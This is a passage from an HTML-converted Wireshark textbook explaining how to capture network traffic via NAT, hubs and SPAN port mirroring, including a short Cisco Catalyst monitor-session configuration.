if you change your network configuration repeatedly, it might save you trouble if you stick to NAT networking. This ensures the configuration for your virtual machines doesn&#8217;t have to be updated each time you change networks, and it will fool the network into thinking only one machine is connected.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When you have a VM configured in NAT mode, you can sniff all the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section146" ><p class=MsoBodyText  style="margin-top:3.5000pt;margin-right:5.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >traffic the machine sends to the outside network by sniffing on whatever interface your default gateway is accessible on. The downside is that you are not able to easily distinguish between VMs, which are both using NAT. You also cannot easily distinguish between traffic generated by your host and those packets generated by VMs. Often NAT is useful only when you want to get access to the Internet from your VMs and you are not too concerned with getting good packet data from the traffic that VM sends.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Sniffing with Hubs</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the earlier days of networking, the typical method of connecting machines on a network was with a hub. Today&#8217;s method is with a switch. As you know, the primary difference between switches and hubs is the traffic from one system is repeated out all other ports on a hub, whereas a switch is intelligent enough to direct the traffic only out the needed port. Switches learn what systems (known by their layer 2 MAC address) are hanging off of which ports. Hubs broadcast all traffic everywhere.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Remembering this key difference explains why sniffing with hubs means getting all the traffic, whereas sniffing off a switch can mean hearing only some of the conversation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It&#8217;s also important to remember the OSI model, the representative layering of how data travels and is handled between systems. Bits from the Physical layer get switched, routed, error-checked, authenticated, presented, and formatted, <a name="_bookmark282" ></a>eventually leading to the top layer (Application). Discussion about switches and hubs is at layer 2, the Data Link layer, where network traffic is split into frames.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Switches versus Hubs</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The difference between these two network devices was briefly mentioned in the introduction of this section. It boils down to the fact that a hub does not do anything intelligent with the frame. A hub operates on layer 1 (the Physical layer) of the OSI model. All bits are copied to every other port except the receiving one. This last bit of intelligence is essential in the case of two hubs connected to each other</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section147" ><p class=MsoBodyText  align=justify  style="margin-top:3.8000pt;margin-right:68.9500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >with one cable. If it would copy a broadcast frame to all ports, including the receiving one, it would cause a broadcast</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >storm, amplifying that single broadcast</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >frame.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Switches are more intelligent devices. They operate on layer 2 of the OSI model and thereby understand Ethernet (MAC) addresses. This enables a switch to decide to which port to send traffic by keeping a table that lists ports and MAC addresses. Broadcast frames are still forwarded to all ports except the receiving port. This behavior is the reason some (ethical) hackers still bring an old hub to consulting jobs. The fact that it keeps a table of MAC addresses means that you are not able to see traffic not addressed to you. This is generally a good thing, but not for those in the security crowd if they are investigating suspicious activity or are in an offensive role.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:15.0500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Sniffing from a Hub</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To capture network traffic passing through a specific Ethernet cable, you need an Ethernet hub and two extra cables. After connecting all the cables, there is a Y-formed connection, as shown in<a name="_bookmark283" ></a>&nbsp;</span><span><a href="#_bookmark284" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-11</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="320"  height="0" ></td></tr><tr><td></td><td><img width="380"  height="223"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker191037.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark284" ></a><span><a href="#_bookmark283" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-11:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Capturing packets with a hub</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Packets should now be repeated on all three sides of the connection. A few things have changed in the network, though. Most connections automatically negotiate their physical connections to full-duplex, allowing both transmitting <a name="_bookmark285" ></a>and receiving at the same time when connected normally. When you connect a hub, all connections negotiate to half-duplex and therefore re-enable collision-detection protocols. This is an anomaly in modern switched networks. Full- duplex connections were not possible before switched networks</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section148" ><p class=MsoBodyText  style="margin-top:3.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >because the collision domain of the connection contained more than one device.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="223"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker191715.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As shown in<a name="_bookmark286" ></a>&nbsp;</span><span><a href="#_bookmark287" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-12</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, a frame coming in to port number 1 will be duplicated to ports 2 and 3. This is similar to the behavior of a switch without Spanning Tree Protocol (STP) enabled, meaning all traffic is directed out, without regard to a possible looping.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="320"  height="0" ></td></tr><tr><td></td><td><img width="380"  height="223"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker192011.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark287" ></a><span><a href="#_bookmark286" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-12:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Traffic when sniffing on a hub</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="360"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker192089.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section149" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:83.0000px;" ><img width="763"  height="83"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker192117.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:8.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.3500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >SPAN Ports</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:17.2500pt;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Switched Port Analyzer </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(SPAN) is a feature found on most managed switches or routers. Not every manufacturer uses the proprietary name SPAN, but the functionality is more or less the same. Another common term for the same <a name="_bookmark288" ></a>principle is </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >port mirroring</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Sniffing on a SPAN port is explained in the following sections along with the configuration of a SPAN port on the most common network devices.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Sniffing on a SPAN Port</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The traffic you see on your SPAN port depends on the configuration and capabilities of your capturing device. For this example, assume you want to capture the traffic of one device, as that is the simplest case.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Sniffing on the SPAN port is extremely versatile. Most of the time you can listen-enable the mirroring of packets from a list of interfaces or even an entire virtual LAN (VLAN). There is a serious pitfall, however: If you are sniffing multiple ports or an entire VLAN, there is a high chance you will get duplicate packets. This is a side effect of sniffing on a VLAN or multiple ports, so if you absolutely have to do this to capture all the traffic you need, there is no other option.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There is also the question of connectivity for the listening system. Depending on the vendor of the switch, connectivity may be disabled for a mirror destination port. This is a sensible default, because your own connectivity would only contaminate the network traffic you are capturing, which could be problematic in a mobile pen-testing scenario. So, be prepared and investigate the options your switch supports.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><a name="_bookmark289" ></a><span><a href="#_bookmark290" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-13</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows a diagram of the connections in a SPAN-sniffing setup. The dotted line represents the copied packet originally destined for another client also being transmitted to the attacker.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section150" ><p class=MsoBodyText  style="margin-left:128.0000pt;" ><img width="380"  height="223"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker193895.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark290" ></a><span><a href="#_bookmark289" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-13:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >SPAN sniffing connections</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="224"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker193969.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><h4 style="margin-top:4.5000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Configuring SPAN on Cisco</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;" ><a name="_bookmark291" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To monitor all the traffic coming in or out from FastEthernet port 1/1, use the following snippet. This is the syntax for most of the Catalyst series of Cisco switches:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Switch#conf t</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:17.2500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Switch(config)#monitor session 1 source interface</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >fastethernet 1/1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Switch(config)#monitor session 1 destination interface fastethernet 1/2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Switch(config)#exit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can check the results of your commands with the following:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >show monitor session 1.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >By default, there are two assumptions in the previous configuration. The first monitor statement assumes that both directions should be monitored. This can be overridden by specifying </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >both | rx | tx</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The second assumption is probably less expected. In a Cisco SPAN configuration, a destination monitor port by default does not accept</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section151" ><p class=MsoBodyText  style="margin-top:4.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >any incoming traffic. You are only able to receive the monitored traffic, and no connection to the network can be made. To enable incoming traffic on the destination port, you can append </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ingress vlan </span><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-style:italic;font-size:12.0000pt;" >vlanid</span></i><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-style:italic;font-size:12.0000pt;" ><o:p></o:p></span></i></p><p class=MsoBodyText  align=justify  style="margin-right:8.1000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to specify the VLAN incoming traffic should be sent to. For example,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to capture traffic received on the monitored port and allow normal traffic on the destination port, enter the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >following:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.6000pt;margin-right:17.2500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Switch(config)#monitor session 1 source interface</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >fastethernet 1/1 rx</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Switch(config)#monitor session 1 destination interface fastethernet 1/2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=right  style="margin-top:0.0000pt;margin-right:51.3500pt;margin-left:0.0000pt;text-indent:0.0000pt;text-align:right;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ingress vlan 5</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Switch(config)#exit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:6.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.0500pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Different models of the Catalyst switch series will have different syntax. Cisco routers are also not covered by this example. The general idea will be the same, however, so refer to the references and examples from Cisco if you are trying to configure port mirroring on a specific model and the previous examples do not seem to apply.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Configuring SPAN on HP</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >HP ProCurves are a common alternative to Cisco 